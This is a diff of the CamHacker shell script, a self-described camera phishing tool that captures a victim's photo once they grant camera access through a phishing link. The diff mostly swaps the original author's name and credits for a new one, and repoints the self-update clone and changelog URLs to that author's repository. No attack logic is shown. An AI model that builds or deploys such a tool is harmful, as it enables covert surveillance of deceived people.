@@ -3,13 +3,10 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# Author     : ZIHAD HOSSAIN RAFI
+# Github     : https://github.com/MR-ZIHAD
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : MR-ZIHAD (2022-2023)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +14,7 @@
 : '
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2022 MRGZIHAD
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -74,7 +71,7 @@ ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}                                    [By MR-RAFI]
+${blue}                                    [By MR-ZIHAD]
 "
 
 ngrok_help="
@@ -401,7 +398,7 @@ else
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/MR-ZIHAD/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -409,7 +406,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/MR-ZIHAD/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
